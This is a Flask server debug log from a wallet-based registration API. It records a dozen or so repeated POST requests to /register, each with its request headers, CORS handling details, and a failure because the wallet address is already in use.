2025-07-09 10:55:21,211 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:21,211 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:21,211 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:21,211 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:21,216 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:21,216 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:21,216 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:21,217 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:21,217 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:21,368 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:21,368 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:21,368 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:21,368 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:21,368 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:21,373 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:21,373 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:21,373 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:21,374 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:21,374 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:21,529 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:21,529 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:21,529 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:21,530 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:21,530 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:21,535 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:21,535 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:21,535 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:21,535 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:21,535 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:21,672 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:21,673 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:21,673 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:21,673 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:21,673 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:21,677 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:21,677 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:21,677 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:21,678 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:21,678 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:21,835 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:21,835 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:21,836 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:21,836 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:21,836 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:21,845 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:21,845 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:21,845 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:21,845 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:21,845 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:21,991 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:21,991 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:21,991 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:21,991 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:21,991 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:21,996 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:21,996 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:21,996 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:21,996 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:21,997 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:22,136 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:22,136 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:22,137 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:22,137 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:22,137 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:22,142 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:22,142 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:22,142 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:22,142 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:22,142 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:22,294 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:22,295 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:22,295 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:22,295 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:22,295 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:22,299 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:22,299 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:22,299 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:22,299 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:22,300 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:22,440 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:22,440 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:22,440 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:22,440 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:22,440 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:22,445 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:22,445 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:22,446 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:22,446 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:22,446 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:45,847 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:45,848 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:45,848 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:45,848 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:45,848 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:45,855 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:45,855 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:45,856 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:45,856 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:45,856 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:46,265 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:46,266 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:46,266 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:46,266 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:46,266 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:46,271 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:46,271 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:46,271 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:46,272 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:46,272 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:46,489 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:46,489 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:46,490 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:46,490 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:46,490 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:46,496 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
